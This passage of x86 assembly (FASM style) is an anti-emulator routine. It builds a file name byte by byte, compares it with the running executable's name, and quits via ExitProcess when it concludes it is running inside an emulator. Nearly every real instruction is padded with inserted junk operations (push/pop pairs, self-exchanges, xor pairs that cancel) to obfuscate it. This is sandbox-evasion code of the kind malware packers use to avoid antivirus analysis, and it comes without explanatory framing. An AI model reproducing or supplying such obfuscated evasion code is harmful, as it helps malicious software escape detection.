																				pushfd
																				xor		ecx, 0x755f7c26
																				xor		ecx, 0x755f7c26
																				popfd
	mov		byte[eax + 7], bl ;x
																				push	eax
																				pop		eax
	sub		bl, 19
																				push	edx
																				pop		edx
	mov		byte[eax + 8], bl ;e
																				pushfd
																				inc		ebx
																				dec		ebx
																				popfd
																				xchg	eax, eax
	mov		byte[eax + 9], 0
																				xchg	eax, eax
	lea		ebx, [ExecutableFileName]
																				mov		ecx, ecx
																				xchg	edi, esi
																				xchg	esi, edi
	cinvoke	strcmpi, eax, ebx
																				push	ecx
																				pop		ecx
																				pushfd
																				inc		eax
																				dec		eax
																				popfd
	test	eax, eax
																				push	ebx
																				pop		ebx
																				pushfd
																				push	eax
																				add		esp, 4
																				popfd
	jz		.emulator
																				xchg	ecx, ecx
@@:

	; --------------------------------------------------------------------------

	; No emulator detected
																				push	ebx esi
																				pop		esi ebx
																				xchg	edi, ebx
																				xchg	ebx, edi
	xor		eax, eax
																				xchg	edi, edi
	ret

.emulator:
	; Running in emulator
																				pushfd
																				push	edi
																				add		esp, 4
																				popfd
	invoke	ExitProcess, 0
																				push	eax
																				pop		eax
																				push	edi ecx
																				pop		ecx edi
	ret
endp
